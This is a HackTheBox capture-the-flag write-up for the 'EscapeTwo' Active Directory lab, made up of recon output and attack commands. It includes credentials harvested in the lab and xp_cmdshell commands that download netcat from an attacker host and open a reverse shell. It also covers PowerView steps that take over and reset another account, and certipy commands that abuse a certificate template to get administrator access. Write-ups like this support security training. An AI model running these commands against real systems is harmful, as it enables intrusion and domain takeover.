---
title: EscapeTwo - Active directory
date: 2025-12-10 00:00:00 +0000
categories: [HackTheBox Writeups, Windows]
tags: [hackthebox, windows]
---


```
ares@legion:~/HackTheBox/EscapeTwo$ sudo nmap -sVC -A -T4 10.129.63.50           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 14:00 EET
Nmap scan report for 10.129.63.50 (10.129.63.50)
Host is up (0.052s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-16 12:01:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-16T12:02:27+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-16T12:02:27+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.63.50:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.63.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-16T11:45:38
|_Not valid after:  2055-11-16T11:45:38
|_ssl-date: 2025-11-16T12:02:27+00:00; +2s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-16T12:02:27+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-11-16T12:02:27+00:00; +2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-16T12:01:50
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   50.46 ms 10.10.14.1 (10.10.14.1)
2   60.77 ms 10.129.63.50 (10.129.63.50)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.20 seconds
```

rose / KxEPkKe6R8su

Download shares 
```
smbclient //10.129.232.128/"Accounting Department" -U rose
```

```
echo "10.129.63.50 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts
```

Creds from excel:

|        |          |                                               |        |                  |
| ------ | -------- | --------------------------------------------- | ------ | ---------------- |
| Angela | Martin   | [angela@sequel.htb](mailto:angela@sequel.htb) | angela | 0fwz7Q4mSpurIt99 |
| Oscar  | Martinez | [oscar@sequel.htb](mailto:oscar@sequel.htb)   | oscar  | 86LxLBMgEWaKUnBG |
| Kevin  | Malone   | [kevin@sequel.htb](mailto:kevin@sequel.htb)   | kevin  | Md9Wlq1E5bZnVDVo |
| NULL   | NULL     | [sa@sequel.htb](mailto:sa@sequel.htb)         | sa     | MSSQLP@ssw0rd!   |

Can either grep and read each line from .xml or change magic bytes to  open xlsx format:
![[Pasted image 20251116140452.png]]

Lateral Movement:
```
impacket-mssqlclient -p 1433 sa@10.129.63.50
<MSSQLP@ssw0rd!>

enable_xp_cmdshell

EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.76:8000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';

EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.76 4444';
```
https://github.com/vinsworldcom/NetCat64/releases


![[Pasted image 20251116142803.png]]

> Pay attention to: sql-Configuration.INI
New pass to add to creds: 
WqSZAF6CysDQbGb3 + user ryan 
![[Pasted image 20251116142839.png]]


Privesc Winrm ryan session:
```
bundle exec evil-winrm.rb -i 10.129.56.175 -u ryan -p 'WqSZAF6CysDQbGb3'
```

WriteOwner permissions over the user CA_SVC
```
certutil -urlcache -split -f http://10.10.14.76:8000/PowerView.ps1 C:\Users\ryan\Desktop\PowerView.ps1
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan" 
$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force 
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

```
certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.56.175 -stdout
```

```
certipy-ad template \
  -u ca_svc@sequel.htb \
  -p 'Password123!!' \
  -template DunderMifflinAuthentication \
  -write-configuration DunderMifflinAuthentication.json \
  -force \
  -dc-ip 10.129.232.128

```

Modify DunderMifflinAuthentication.json:
![[Pasted image 20251117122102.png]]

```
certipy-ad req \
  -username ca_svc@sequel.htb \
  -p 'Password123!!' \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \
  -upn administrator@sequel.htb
```
![[Pasted image 20251117122313.png]]

```
certipy-ad auth \
  -pfx administrator.pfx \
  -domain sequel.htb \
  -dc-ip 10.129.232.128
```
![[Pasted image 20251117122409.png]]
